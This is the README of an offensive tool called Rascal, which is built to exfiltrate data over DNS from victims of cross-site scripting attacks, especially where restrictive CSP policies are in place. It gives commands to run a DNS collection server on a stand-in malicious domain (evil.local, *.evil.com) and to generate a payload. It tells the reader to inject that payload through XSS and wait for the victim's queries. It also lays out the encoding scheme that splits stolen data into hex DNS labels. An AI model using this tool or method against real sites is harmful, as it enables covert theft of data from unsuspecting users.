# Rascal

Rascal is a DNS exfiltration group of tools specificaly designed for XSS attacks, specially when restrictive CSP policies are found. 

## Install

First set up a SQlite db

  sqlite3 rascal.db < init.sql
  pip install -r requeriments.txt


## Usage
Start the server

  python bribon.py --db /usr/local/bribon/bribon.db --domain evil.local -i "*.evil.com IN A 10.22.3.55" --logger bribonlogger

Where:
   --domain <domain>: quieries within this domain will be parsed and recorded
   -i "<zone register>"
   --logger <logger class>: dynamically loaded class to log messages.

Generate a payload

   python rascal.py --code --domain <domain> 


Inject the payload within a XSS and wait until you have receive queries from victim. 


## Exfiltration details

Query format is the following one:

  <hex data>.<part>.<session>.<domain>

Where:
- hex data: data codified in hexadecimal
- part: sequence ID of the whole data exfiltred. Data could be splitted in several parts that will be sent independently from the victim. This indicator allows the program to concat the data in order.
- session: this is a random generated string unique for each XSS execution. Allow to group all parts of a same session. Additionally, there is a custom label concatenated to the session sstring that allow to filter easily by tags different attacks tests.
- domain: your malicious domain where the query will be sent.


